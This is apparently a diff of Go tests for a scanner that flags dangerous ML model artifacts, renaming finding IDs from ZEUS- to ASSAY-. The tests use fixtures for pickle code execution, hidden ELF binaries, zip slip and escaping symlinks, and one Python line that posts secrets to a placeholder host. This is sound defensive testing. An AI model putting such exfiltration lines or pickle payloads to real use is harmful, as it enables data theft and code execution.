@@ -67,11 +67,11 @@ func TestDetectsPickleRCEPayload(t *testing.T) {
 
 	report := inspect(t, dir)
 
-	if !hasID(report, "ZEUS-PICKLE-001") {
+	if !hasID(report, "ASSAY-PICKLE-001") {
 		t.Fatalf("did not flag os.system in pickle; findings: %v", findingIDs(report))
 	}
 	for _, f := range report.Findings {
-		if f.ID == "ZEUS-PICKLE-001" && f.Severity != "Critical" {
+		if f.ID == "ASSAY-PICKLE-001" && f.Severity != "Critical" {
 			t.Errorf("severity = %q, want Critical for pickle RCE", f.Severity)
 		}
 	}
@@ -81,7 +81,7 @@ func TestDetectsSubprocessInPickle(t *testing.T) {
 	dir := t.TempDir()
 	write(t, dir, "model.bin", pickleWithGlobal("subprocess", "Popen"))
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-PICKLE-001") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-PICKLE-001") {
 		t.Fatalf("did not flag subprocess.Popen; findings: %v", findingIDs(report))
 	}
 }
@@ -97,7 +97,7 @@ func TestBenignPickleStillFlagged(t *testing.T) {
 	if len(report.Findings) == 0 {
 		t.Fatal("a pickle file produced no findings at all")
 	}
-	if hasID(report, "ZEUS-PICKLE-001") {
+	if hasID(report, "ASSAY-PICKLE-001") {
 		t.Error("flagged a benign pickle as containing a dangerous import")
 	}
 }
@@ -112,7 +112,7 @@ func TestDetectsTrustRemoteCode(t *testing.T) {
 
 	report := inspect(t, dir)
 
-	if !hasID(report, "ZEUS-HF-001") {
+	if !hasID(report, "ASSAY-HF-001") {
 		t.Fatalf("did not flag trust_remote_code; findings: %v", findingIDs(report))
 	}
 }
@@ -122,7 +122,7 @@ func TestTrustRemoteCodeFalseIsNotFlagged(t *testing.T) {
 	config, _ := json.Marshal(map[string]any{"trust_remote_code": false})
 	write(t, dir, "config.json", config)
 
-	if report := inspect(t, dir); hasID(report, "ZEUS-HF-001") {
+	if report := inspect(t, dir); hasID(report, "ASSAY-HF-001") {
 		t.Error("flagged trust_remote_code: false as dangerous")
 	}
 }
@@ -134,7 +134,7 @@ func TestDetectsAutoMap(t *testing.T) {
 	})
 	write(t, dir, "config.json", config)
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-HF-002") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-HF-002") {
 		t.Fatalf("did not flag auto_map; findings: %v", findingIDs(report))
 	}
 }
@@ -149,7 +149,7 @@ def load():
 
 	report := inspect(t, dir)
 
-	if !hasID(report, "ZEUS-PY-001") {
+	if !hasID(report, "ASSAY-PY-001") {
 		t.Fatalf("did not flag os.system in model code; findings: %v", findingIDs(report))
 	}
 }
@@ -158,7 +158,7 @@ func TestDetectsNetworkEgressInPython(t *testing.T) {
 	dir := t.TempDir()
 	write(t, dir, "utils.py", []byte("import requests\nrequests.post('http://x/y', data=secrets)\n"))
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-PY-003") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-PY-003") {
 		t.Fatalf("did not flag network egress; findings: %v", findingIDs(report))
 	}
 }
@@ -182,7 +182,7 @@ func TestDetectsZipSlip(t *testing.T) {
 
 	report := inspect(t, dir)
 
-	if !hasID(report, "ZEUS-ARCHIVE-003") {
+	if !hasID(report, "ASSAY-ARCHIVE-003") {
 		t.Fatalf("did not flag zip slip; findings: %v", findingIDs(report))
 	}
 }
@@ -206,10 +206,10 @@ func TestDetectsPickleNestedInTorchArchive(t *testing.T) {
 
 	report := inspect(t, dir)
 
-	if !hasID(report, "ZEUS-PICKLE-001") {
+	if !hasID(report, "ASSAY-PICKLE-001") {
 		t.Fatalf("did not find the pickle payload inside the torch archive; findings: %v", findingIDs(report))
 	}
-	if !hasID(report, "ZEUS-PICKLE-002") {
+	if !hasID(report, "ASSAY-PICKLE-002") {
 		t.Errorf("did not note the torch zip container; findings: %v", findingIDs(report))
 	}
 }
@@ -220,7 +220,7 @@ func TestDetectsELFBinaryHiddenAsData(t *testing.T) {
 	// evasion against extension-based scanning.
 	write(t, dir, "vocab.txt.dat", append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, make([]byte, 64)...))
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-BIN-001") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-BIN-001") {
 		t.Fatalf("did not flag the hidden ELF binary; findings: %v", findingIDs(report))
 	}
 }
@@ -229,7 +229,7 @@ func TestDetectsSharedLibrary(t *testing.T) {
 	dir := t.TempDir()
 	write(t, dir, "custom_op.so", []byte{0x7f, 'E', 'L', 'F'})
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-NATIVE-001") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-NATIVE-001") {
 		t.Fatalf("did not flag the shared library; findings: %v", findingIDs(report))
 	}
 }
@@ -259,7 +259,7 @@ func TestSafetensorsWithLyingHeaderLength(t *testing.T) {
 	binary.LittleEndian.PutUint64(buf, 1<<40) // header claims 1 TiB
 	write(t, dir, "model.safetensors", append(buf, []byte("{}")...))
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-ST-002") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-ST-002") {
 		t.Fatalf("did not flag the impossible header length; findings: %v", findingIDs(report))
 	}
 }
@@ -268,7 +268,7 @@ func TestDetectsSuspiciousONNXOperator(t *testing.T) {
 	dir := t.TempDir()
 	write(t, dir, "model.onnx", []byte("\x08\x07\x12\x04test com.microsoft.PythonOp trailing"))
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-ONNX-001") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-ONNX-001") {
 		t.Fatalf("did not flag PythonOp; findings: %v", findingIDs(report))
 	}
 }
@@ -280,7 +280,7 @@ func TestReportsExecutableBit(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	if report := inspect(t, dir); !hasID(report, "ZEUS-EXEC-001") {
+	if report := inspect(t, dir); !hasID(report, "ASSAY-EXEC-001") {
 		t.Fatalf("did not flag the executable bit; findings: %v", findingIDs(report))
 	}
 }
@@ -293,7 +293,7 @@ func TestSymlinkEscapingArtifactIsFlagged(t *testing.T) {
 
 	report := inspect(t, dir)
 
-	if !hasID(report, "ZEUS-LINK-001") {
+	if !hasID(report, "ASSAY-LINK-001") {
 		t.Fatalf("did not flag the escaping symlink; findings: %v", findingIDs(report))
 	}
 }
@@ -305,7 +305,7 @@ func TestInternalSymlinkIsAllowed(t *testing.T) {
 		t.Skipf("symlinks unavailable: %v", err)
 	}
 
-	if report := inspect(t, dir); hasID(report, "ZEUS-LINK-001") {
+	if report := inspect(t, dir); hasID(report, "ASSAY-LINK-001") {
 		t.Error("flagged a symlink that stays inside the artifact")
 	}
 }
@@ -340,7 +340,7 @@ func TestUnreadableFileDoesNotAbortScan(t *testing.T) {
 
 	report := inspect(t, dir)
 
-	if !hasID(report, "ZEUS-PICKLE-001") {
+	if !hasID(report, "ASSAY-PICKLE-001") {
 		t.Errorf("did not reach the nested pickle; findings: %v", findingIDs(report))
 	}
 }
@@ -352,7 +352,7 @@ func TestFindingsCarryLocation(t *testing.T) {
 	report := inspect(t, dir)
 
 	for _, f := range report.Findings {
-		if f.ID != "ZEUS-PICKLE-001" {
+		if f.ID != "ASSAY-PICKLE-001" {
 			continue
 		}
 		if !strings.Contains(f.Location, "nested/deep/evil.pkl") {
